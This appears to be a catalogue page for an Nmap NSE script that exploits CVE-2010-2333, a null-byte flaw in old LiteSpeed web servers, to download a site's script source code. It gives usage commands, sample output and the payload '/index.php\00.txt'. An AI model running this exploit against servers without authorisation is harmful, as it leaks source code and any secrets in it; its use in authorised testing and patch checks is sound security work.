---
title: "http-litespeed-sourcecode-download"
source: unofficial
category: "Vuln"
categories:
  - "vuln"
  - "intrusive"
  - "exploit"
shortDescription: "Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x before 4.0.15 to retrieve the target script's source code by sending a HTTP request with a null byte followed by a .txt file extension (CVE-2010-2333)."
risk: intrusive
tags:
  - "vuln"
  - "intrusive"
  - "exploit"
  - "cldrn/nmap-nse-scripts"
scriptTypes: []
protocols: []
ports: []
usage: "nmap -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php <host>\nnmap -p8088 --script http-litespeed-sourcecode-download <host>"
outputPreview:
  - "PORT     STATE SERVICE    REASON"
  - "8088/tcp open  radan-http syn-ack"
  - "| http-litespeed-sourcecode-download.nse: /phpinfo.php source code:"
  - "| <HTML>"
  - "| <BODY>"
  - "|    <?php phpinfo() ?>"
author: "Paulino Calderon (upstream: cldrn/nmap-nse-scripts)"
reference:
  label: "View Upstream Script Source"
  url: "https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/http-litespeed-sourcecode-download.nse"
---

Imported from the upstream repository [cldrn/nmap-nse-scripts](https://github.com/cldrn/nmap-nse-scripts).
Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x before 4.0.15 to retrieve the target script's source code by sending a HTTP request with a null byte followed by a .txt file extension (CVE-2010-2333).
If the server is not vulnerable it returns an error 400. If index.php is not found, you may try /phpinfo.php which is also shipped with LiteSpeed Web Server. The attack payload looks like this:
* <code>/index.php\00.txt</code>
References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2333
* http://www.exploit-db.com/exploits/13850/
